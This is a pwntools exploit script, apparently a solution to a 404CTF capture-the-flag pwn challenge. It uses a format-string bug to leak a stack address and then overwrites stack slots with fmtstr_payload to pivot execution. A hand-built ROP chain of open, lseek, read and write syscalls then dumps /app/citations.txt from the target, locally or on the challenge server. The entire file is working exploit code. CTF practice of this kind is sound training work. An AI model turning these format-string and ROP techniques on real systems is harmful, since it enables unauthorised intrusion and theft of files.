#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./une_citation_pas_comme_les_autres_1_2')
#libc = ELF('./libc.so.6')
#rop = ROP(exe)

host, port = "challenges.404ctf.fr", "31719"

if args.REMOTE:
  p = remote(host,port)
else:
    p = process(exe.path)

sla('>>> ', '2')
sla(': ', '@%p.')
stack = int(rcu('@','.'),16)
logleak('stack', stack)

rop = ROP(exe)
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rbp_leave = 0x000000000047cb3b # pop rbp ; clc ; leave ; ret
pop_rdx = 0x000000000047ce8b # pop rdx ; pop rbx ; ret
syscall = 0x000000000041a206 # syscall; ret;
xchg_edi_eax = 0x000000000046f686 # xchg edi, eax ; ret
# pivot here
fmt = fmtstr_payload(6, {(stack+0x5b8): pop_rbp_leave}, write_size='short')
sla('>>> ', '2')
sla(': ', fmt)

fmt = fmtstr_payload(6, {(stack+0x5c0): (stack+0x1b0+0x78)}, write_size='short')
sla('>>> ', '2')
sla(': ', fmt)

fmt = fmtstr_payload(6, {(stack+0x5a8): pop_rdi}, write_size='short')
fmt = fmt.ljust(0x60,b'\x00')+b'/app/citations.txt\x00'
fmt = fmt.ljust(0x80,b'\x00')
# open citations.txt
fmt += p64(pop_rdi)+p64(stack+0x1b0+0x60)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
# seek to the end
fmt += p64(xchg_edi_eax)+p64(pop_rsi)+p64((1<<64)-0x100)+p64(pop_rdx)+p64(2)*2+p64(pop_rax)+p64(8)+p64(syscall)
# read it
fmt += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack-0x100)+p64(pop_rdx)+p64(0x100)*2+p64(pop_rax)+p64(0)+p64(syscall)
# write it
fmt += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(stack-0x100)+p64(pop_rdx)+p64(0x100)*2+p64(pop_rax)+p64(1)+p64(syscall)


sla('>>> ', '2')
sla(': ', fmt)
buff = p.recv()

p.interactive()

